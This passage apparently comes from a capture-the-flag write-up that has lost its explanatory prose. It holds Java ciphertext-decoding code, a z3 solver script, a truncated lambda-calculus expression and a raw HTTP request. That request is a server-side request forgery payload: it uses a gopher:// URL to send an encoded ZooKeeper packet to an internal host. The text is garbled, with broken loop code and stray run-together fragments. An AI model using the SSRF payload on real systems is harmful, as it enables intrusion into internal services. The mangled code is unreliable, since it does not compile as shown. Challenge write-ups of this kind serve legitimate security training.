        }
        byte[] ooxxooxxooarray = ooxxooxxoo.getBytes();
        int[] ooxxooxxooxx = new int[16];
        int i;
        for(i = 0; i >> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }
    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    public static void main(String[] args) throws Exception {
        byte[] a =  Base64.decode("IgMDcaHeDcHTRr1SUS7urw==");
        System.out.println(new String(de11(encrypt1("1234567890123456".getBytes()))));
        byte[] c = de22(a);
        System.out.println(bytesToHex(c));
         //aes.decrypt('097DB71BC22864FA79E182190DA7B039'.decode('hex')).encode('hex')
        byte[] d = hexStringToByteArray("acbdcb5bb9db3cd99fbe1f7a83301f82");
        byte[] e = de11(d);
        System.out.println(bytesToHex(e));
    }
}
providerzookeeperconsumer
space
pythonz3dump
GET /?
url=gopher://10.0.20.11:2181/_%2500%2500%2500%252d%2500%2500%2500%2500%2500%2500%2500%2
500%2500%2500%2500%2500%2500%2500%2575%2530%2500%2500%2500%2500%2500%2500%2500%2500%250
0%2500%2500%2510%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%
2500%2500%2500%2500%2500%2500%250e%2500%2500%2500%2501%2500%2500%2500%250c%2500%2500%25
00%2501%252f%2500 HTTP/1.1
Host: 172.35.13.101:8090
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
from z3 import *
a0 = Int('a0')
a1 = Int('a1')
a2 = Int('a2')
a3 = Int('a3')
a4 = Int('a4')
a5 = Int('a5')
a6 = Int('a6')
a7 = Int('a7')
a8 = Int('a8')
a9 = Int('a9')
a10 = Int('a10')
a11 = Int('a11')
a12 = Int('a12')
a13 = Int('a13')
a14 = Int('a14')
a15 = Int('a15')
a16 = Int('a16')
a17 = Int('a17')
a18 = Int('a18')
a19 = Int('a19')
lamaba
lambda3typeexpr nodetype 0xtype 1lambda x N(x)type2M N(M)
so = Solver()
so.add( (((((((0+(2*((a10+0))+0)+0))+(10*((a8+0))+0)+0))+(3*
((a11+0))+0)+0))+0)-1753==0)
so.add( (((((((0+(7*((a17+0))+0)+0))+(6*((a4+0))+0)+0))+(8*((a16+0))+0)+0))+0)-2117==0)
so.add( (((((((0+(4*((a5+0))+0)+0))+(3*((a15+0))+0)+0))+(6*((a6+0))+0)+0))+0)-1071==0)
so.add( (((((((0+(3*((a17+0))+0)+0))+(5*((a4+0))+0)+0))+(2*((a16+0))+0)+0))+0)-1116==0)
so.add( (((((((0+(10*((a14+0))+0)+0))+(4*((a0+0))+0)+0))+(10*
((a9+0))+0)+0))+0)-2190==0)
so.add( (((((((0+(9*((a14+0))+0)+0))+(4*((a0+0))+0)+0))+(4*((a9+0))+0)+0))+0)-1764==0)
so.add( (((((((0+(2*((a3+0))+0)+0))+(1*((a2+0))+0)+0))+(3*((a1+0))+0)+0))+0)-617==0)
so.add( (((((((0+(9*((a14+0))+0)+0))+(8*((a0+0))+0)+0))+(3*((a9+0))+0)+0))+0)-2193==0)
so.add( (((((((0+(1*((a17+0))+0)+0))+(5*((a4+0))+0)+0))+(2*((a16+0))+0)+0))+0)-866==0)
so.add( (((((((0+(8*((a5+0))+0)+0))+(2*((a15+0))+0)+0))+(8*((a6+0))+0)+0))+0)-1594==0)
so.add( (((((((0+(5*((a12+0))+0)+0))+(10*((a13+0))+0)+0))+(2*
((a7+0))+0)+0))+0)-1153==0)
so.add( (((((((0+(10*((a12+0))+0)+0))+(5*((a13+0))+0)+0))+(8*
((a7+0))+0)+0))+0)-1737==0)
so.add( (((((((0+(5*((a12+0))+0)+0))+(9*((a13+0))+0)+0))+(9*((a7+0))+0)+0))+0)-1445==0)
so.add( (((((((0+(4*((a10+0))+0)+0))+(7*((a8+0))+0)+0))+(7*((a11+0))+0)+0))+0)-2119==0)
so.add( (((((((0+(5*((a3+0))+0)+0))+(2*((a2+0))+0)+0))+(5*((a1+0))+0)+0))+0)-1237==0)
so.add( (((((((0+(9*((a5+0))+0)+0))+(8*((a15+0))+0)+0))+(4*((a6+0))+0)+0))+0)-1463==0)
so.add( (((((((0+(7*((a10+0))+0)+0))+(8*((a8+0))+0)+0))+(4*((a11+0))+0)+0))+0)-2217==0)
so.add( (((((((0+(6*((a3+0))+0)+0))+(10*((a2+0))+0)+0))+(1*((a1+0))+0)+0))+0)-1871==0)
print(so.check())
print(so.model())
((lambda s_91 lambda s_70 ((91)(70))(91))(((lambda s_184 lambda s_158 ((184)(158))
(184))(((lambda s_255 lambda s_207 ((255)(207))(255))(((lambda s_152 lambda s_184 
((152)(184))(152))(((lambda s_189 lambda s_108 ((189)(108))(189))(((lambda s_133 lambda 
s_107 ((133)(107))(133))(((lambda s_213 lambda s_222 ((213)(222))(213))(((lambda s_133 
lambda s_44 ((133)(44))(133))(((lambda s_120 lambda s_237 ((120)(237))(120))(((lambda 
s_206 lambda s_78 ((206)(78))(206))(((lambda s_118 lambda s_13 ((118)(13))(118))
(((lambda s_92 lambda s_183 ((92)(183))(92))(((lambda s_228 lambda s_101 ((228)(101))
(228))(((lambda s_241 lambda s_26 ((241)(26))(241))(((lambda s_107 lambda s_252 ((107)
(252))(107))(((lambda s_234 lambda s_47 ((234)(47))(234))(((lambda s_116 lambda s_150 
((116)(150))(116))(((lambda s_144 lambda s_145 ((144)(145))(144))(((lambda s_124 lambda 
s_109 ((124)(109))(124))(((lambda s_72 lambda s_85 ((72)(85))(72))(((lambda s_119 
lambda s_8 ((119)(8))(119))(((lambda s_55 lambda s_69 ((55)(69))(55))(((lambda s_249 
lambda s_195 ((249)(195))(249))(((lambda s_2 lambda s_33 ((2)(33))(2))(((lambda s_58 
lambda s_245 ((58)(245))(58))(((lambda s_6 lambda s_62 ((6)(62))(6))(((lambda s_212 
lambda s_41 ((212)(41))(212))(((lambda s_150 lambda s_119 ((150)(119))(150))(((lambda 
s_25 lambda s_244 ((25)(244))(25))(((lambda s_234 lambda s_38 ((234)(38))(234))
(((lambda s_202 lambda s_127 ((202)(127))(202))(((lambda s_79 lambda s_62 ((79)(62))
(79))(((lambda s_191 lambda s_218 ((191)(218))(191))(((lambda s_218 lambda s_109 ((218)
(109))(218))(((lambda s_112 lambda s_150 ((112)(150))(112))(((lambda s_237 lambda s_13 
((237)(13))(237))(((lambda s_62 lambda s_98 ((62)(98))(62))(((lambda s_65 lambda s_158 
((65)(158))(65))(((lambda s_113 lambda s_56 ((113)(56))(113))(((lambda s_203 lambda 
s_23 ((203)(23))(203))(((lambda s_24 lambda s_59 ((24)(59))(24))(((lambda s_4 lambda 
s_251 ((4)(251))(4))(((lambda s_184 lambda s_26 ((184)(26))(184))(((lambda s_231 lambda 
s_82 ((231)(82))(231))(((lambda s_206 lambda s_43 ((206)(43))(206))(((lambda s_149 
lambda s_195 ((149)(195))(149))(((lambda s_149 lambda s_169 ((149)(169))(149))(((lambda 
s_161 lambda s_23 ((161)(23))(161))(((lambda s_67 lambda s_210 ((67)(210))(67))
(((lambda s_212 lambda s_168 ((212)(168))(212))(((lambda s_176 lambda s_4 ((176)(4))
(176))(((lambda s_218 lambda s_37 ((218)(37))(218))(((lambda s_76 lambda s_240 ((76)
(240))(76))(((lambda s_253 lambda s_102 ((253)(102))(253))(((lambda s_40 lambda s_152 
((40)(152))(40))(((lambda s_128 lambda s_0 ((128)(0))(128))(((lambda s_219 lambda s_116 
((219)(116))(219))(((lambda s_41 lambda s_61 ((41)(61))(41))(((lambda s_187 lambda 
s_203 ((187)(203))(187))(((lambda s_16 lambda s_132 ((16)(132))(16))(((lambda s_33 
lambda s_150 ((33)(150))(33))(((lambda s_86 lambda s_213 ((86)(213))(86))(((lambda 
s_153 lambda s_71 ((153)(71))(153))(((lambda s_240 lambda s_19 ((240)(19))(240))
(((lambda s_197 lambda s_206 ((197)(206))(197))(((lambda s_186 lambda s_32 ((186)(32))
(186))(((lambda s_29 lambda s_130 ((29)(130))(29))(((lambda s_218 lambda s_111 ((218)
(111))(218))(((lambda s_150 lambda s_4 ((150)(4))(150))(((lambda s_169 lambda s_233 
((169)(233))(169))(((lambda s_206 lambda s_135 ((206)(135))(206))(((lambda s_110 lambda 
s_170 ((110)(170))(110))(((lambda s_105 lambda s_247 ((105)(247))(105))(((lambda s_98 
lambda s_60 ((98)(60))(98))(((lambda s_249 lambda s_32 ((249)(32))(249))(((lambda s_143 
lambda s_161 ((143)(161))(143))(((lambda s_9 lambda s_6 ((9)(6))(9))(((lambda s_4 
lambda s_158 ((4)(158))(4))(((lambda s_219 lambda s_251 ((219)(251))(219))(((lambda 
s_214 lambda s_59 ((214)(59))(214))(((lambda s_240 lambda s_32 ((240)(32))(240))
(((lambda s_248 lambda s_243 ((248)(243))(248))(((lambda s_39 lambda s_164 ((39)(164))
(39))(((lambda s_13 lambda s_196 ((13)(196))(13))(((lambda s_150 lambda s_151 ((150)
(151))(150))(((lambda s_26 lambda s_185 ((26)(185))(26))(((lambda s_234 lambda s_183 
((234)(183))(234))(((lambda s_190 lambda s_127 ((190)(127))(190))(((lambda s_144 lambda 
s_120 ((144)(120))(144))(((lambda s_187 lambda s_30 ((187)(30))(187))(((lambda s_121 
lambda s_107 ((121)(107))(121))(((lambda s_103 lambda s_223 ((103)(223))(103))(((lambda 
s_135 lambda s_80 ((135)(80))(135))(((lambda s_168 lambda s_227 ((168)(227))(168))
(((lambda s_94 lambda s_168 ((94)(168))(94))(((lambda s_243 lambda s_122 ((243)(122))
(243))(((lambda s_61 lambda s_43 ((61)(43))(61))(((lambda s_244 lambda s_69 ((244)(69))
(244))(((lambda s_244 lambda s_172 ((244)(172))(244))(((lambda s_22 lambda s_141 ((22)
(141))(22))(((lambda s_177 lambda s_194 ((177)(194))(177))(((lambda s_96 lambda s_136 
((96)(136))(96))(((lambda s_128 lambda s_249 ((128)(249))(128))(((lambda s_222 lambda 
s_20 ((222)(20))(222))(((lambda s_101 lambda s_93 ((101)(93))(101))(((lambda s_50 
lambda s_254 ((50)(254))(50))(((lambda s_183 lambda s_210 ((183)(210))(183))(((lambda 
s_124 lambda s_23 ((124)(23))(124))(((lambda s_161 lambda s_208 ((161)(208))(161))
(((lambda s_129 lambda s_246 ((129)(246))(129))(((lambda s_140 lambda s_109 ((140)
(109))(140))(((lambda s_119 lambda s_141 ((119)(141))(119))(((lambda s_250 lambda s_117 
((250)(117))(250))(((lambda s_186 lambda s_183 ((186)(183))(186))(((lambda s_174 lambda 
s_195 ((174)(195))(174))(((lambda s_107 lambda s_97 ((107)(97))(107))(((lambda s_130 
lambda s_21 ((130)(21))(130))(((lambda s_163 lambda s_204 ((163)(204))(163))(((lambda 
s_62 lambda s_6 ((62)(6))(62))(((lambda s_126 lambda s_153 ((126)(153))(126))(((lambda 